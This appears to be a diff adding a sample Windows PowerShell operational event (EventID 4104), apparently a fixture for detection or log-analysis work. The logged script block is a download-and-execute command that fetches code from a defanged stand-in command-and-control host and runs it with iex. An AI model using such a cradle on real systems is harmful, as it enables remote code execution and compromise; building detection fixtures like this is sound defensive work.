@@ -1,0 +1,5 @@
+<Event><System><EventID>4104</EventID><Channel>Microsoft-Windows-PowerShell/Operational</Channel></System>
+ <EventData>
+  <Data Name="ScriptBlockText">iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/s1')</Data>
+  <Data Name="Path"></Data>
+ </EventData></Event>
